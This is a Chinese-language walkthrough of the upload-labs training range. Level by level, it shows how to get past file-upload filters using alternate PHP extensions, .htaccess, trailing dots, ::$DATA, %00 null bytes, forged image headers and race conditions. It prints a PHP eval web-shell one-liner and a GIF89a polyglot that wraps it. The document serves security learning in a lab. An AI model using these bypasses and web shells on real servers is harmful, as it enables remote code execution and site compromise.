# upload-lab
2. 查看源码

![image](https://user-images.githubusercontent.com/76896357/114292010-3c3c9880-9abe-11eb-92a2-03e3e6d93e70.png)

* 上传一个php文件，利用bp抓包

![image](https://user-images.githubusercontent.com/76896357/114292062-9a697b80-9abe-11eb-8b46-cc15ba5ad72f.png)

* 发现这个地方和源码有些类似，索性就改成源码的样子

![image](https://user-images.githubusercontent.com/76896357/114292083-bcfb9480-9abe-11eb-9a03-2715d212d74e.png)

* 刚好上传成功

3. 查看源代码

![image](https://user-images.githubusercontent.com/76896357/114292260-d9e49780-9abf-11eb-9a67-aff585598602.png)

黑名单虽然绕过，但没有全部绕过，尝试其他后缀

![image](https://user-images.githubusercontent.com/76896357/114292377-abb38780-9ac0-11eb-8901-500be4f1f457.png)

php3还是可以的

4. 查看源代码

![image](https://user-images.githubusercontent.com/76896357/114292501-752a3c80-9ac1-11eb-9b60-f515bb580a24.png)

.htaccess文件,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
原文链接:
  https://blog.csdn.net/qq_41381461/article/details/100990862
  
5. 查看源代码

![image](https://user-images.githubusercontent.com/76896357/114293312-a3ab1600-9ac7-11eb-8fdc-d60717f18781.png)

构建.php. .的后缀名直接上传

![image](https://user-images.githubusercontent.com/76896357/114293351-ecfb6580-9ac7-11eb-960f-9f878f0a5a44.png)

  
6. 查看源代码

![image](https://user-images.githubusercontent.com/76896357/114293148-524e5700-9ac6-11eb-881e-28deea048f1a.png)

* 各种黑名单，又多了，but，少了个大小写的绕过
* 构建.Php进行绕过

7. 查看源代码

![image](https://user-images.githubusercontent.com/76896357/114293377-3350c480-9ac8-11eb-8713-504770fab9ac.png)

构建.php 直接上传

![image](https://user-images.githubusercontent.com/76896357/114293465-c853bd80-9ac8-11eb-826e-586f3a621efd.png)


![image](https://user-images.githubusercontent.com/76896357/114293157-7c077e00-9ac6-11eb-82d3-f7c4184cf647.png)

上传成功


8. 查看源码，没有去掉小数点

![image](https://user-images.githubusercontent.com/76896357/114297735-f515ce00-9ae4-11eb-8ea2-43ed44c826a2.png)

直接构建.php.根据windows会自动去掉后缀名的.

![image](https://user-images.githubusercontent.com/76896357/114297786-4cb43980-9ae5-11eb-8192-9794013013ed.png)

9. 查看源码

![image](https://user-images.githubusercontent.com/76896357/114297808-66558100-9ae5-11eb-935a-8210900e361c.png)

* 忽略了::$DATA操作
* 直接构造.php::$DATA

10. 查看源代码

![image](https://user-images.githubusercontent.com/76896357/114297869-c0564680-9ae5-11eb-9175-034f2ab2af30.png)

这里可以让文件的后缀名抵消那些操作，最后剩下.php

比如构建 .php. .

![image](https://user-images.githubusercontent.com/76896357/114297900-eed42180-9ae5-11eb-9760-a66f94062e29.png)

上传成功

11. 查看源代码

![image](https://user-images.githubusercontent.com/76896357/114297943-4d999b00-9ae6-11eb-83dc-5ac07316a4fe.png)

* 用了下%00将php隐藏起来

![image](https://user-images.githubusercontent.com/76896357/114298064-019b2600-9ae7-11eb-997e-b4c527556ec7.png)

上传成功

12. 查看源代码

* 采用了Get方式传参数,可以利用%00，来上传php文件

![image](https://user-images.githubusercontent.com/76896357/115813096-236ca500-a425-11eb-9b59-03402c717734.png)

![image](https://user-images.githubusercontent.com/76896357/115813195-52831680-a425-11eb-919c-6e12998b439d.png)


14. 文件头检测绕过

![image](https://user-images.githubusercontent.com/76896357/115815138-ff12c780-a428-11eb-9362-51a1cf985d26.png)

很显然，这道题检测了文件头

只需要把php一句话加在图片文件里面即可


## 绕过的一些方法

* 服务端校验--白名单

- 配合Apache的解析缺陷 

Apache的解析特性:会从后面开始检查后缀，按最后一个后缀开始，找到合法的后缀进行解析

比如说：一段包含<?php @eval($_POST['cmd']);?>的文件，后缀名是.php.jpg,在打开文件的时候，Apache会解析php代码


* 服务端校验--内容头的校验

函数：

getimagesize

![image](https://user-images.githubusercontent.com/76896357/115867805-2049d700-a46e-11eb-88da-411f9b5fe10d.png)


![image](https://user-images.githubusercontent.com/76896357/115867855-2f308980-a46e-11eb-92b8-479efeeaf7e6.png)


![image](https://user-images.githubusercontent.com/76896357/115867889-38b9f180-a46e-11eb-9020-6819f5bc0dca.png)


比如说GIF

```
GIF89a
<?php @eval($_POST['cmd']);?>

```

* 竞争上传

开启bp，一边用bp上传文件，一边用bp访问文件，

主要是趁代码不注意赶紧访问！！！！




* 日志文件

![image](https://user-images.githubusercontent.com/76896357/115872157-1034f600-a474-11eb-985c-f604bdc2c5fd.png)


* 系统环境

![image](https://user-images.githubusercontent.com/76896357/115872241-280c7a00-a474-11eb-949f-4e810b073f10.png)

* session

![image](https://user-images.githubusercontent.com/76896357/115872304-3b1f4a00-a474-11eb-9a2e-60f130b130d1.png)

session.upload_progress.enabled这个参数在php.ini默认开启，需要手动配置off，如果不是off，就会在上传的过程中生成上传进度的文件，他的存储路径可以在phpinfo(),中找到












